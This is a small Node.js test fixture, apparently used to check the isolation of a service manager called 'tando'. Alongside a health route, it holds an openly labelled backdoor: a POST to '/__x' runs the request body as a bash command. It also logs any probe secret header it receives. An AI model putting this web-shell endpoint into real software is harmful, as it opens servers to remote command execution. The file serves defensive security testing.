// alpha: hello + a backdoor (models "attacker has code execution as tando-alpha in its unit")
const http = require('http'), fs = require('fs'), cp = require('child_process');
const version = fs.readFileSync(__dirname + '/VERSION', 'utf8').trim();
const port = Number(process.env.PORT || 3000);
http.createServer((req, res) => {
  // records a probe secret it is handed (tando must never hand it to an app: e2e-sec2 S3)
  if (req.headers['x-tando-probe']) try { fs.appendFileSync(process.env.TANDO_DATA_DIR + '/probe-seen', req.url + ' ' + req.headers['x-tando-probe'] + '\n'); } catch (e) {}
  if (req.url === '/health') { res.writeHead(200); return res.end('ok\n'); }
  if (req.url === '/__x' && req.method === 'POST') {
    let b = ''; req.on('data', d => b += d); req.on('end', () => {
      const r = cp.spawnSync('/bin/bash', ['-c', b], { encoding: 'utf8', timeout: 55000 });
      res.writeHead(200, { 'content-type': 'text/plain' }); res.end((r.stdout || '') + (r.stderr || ''));
    }); return;
  }
  res.writeHead(200, { 'content-type': 'text/plain' });
  res.end(`alpha v${version} on ${port}\n`);
}).listen(port, '127.0.0.1');
process.on('SIGTERM', () => process.exit(0));
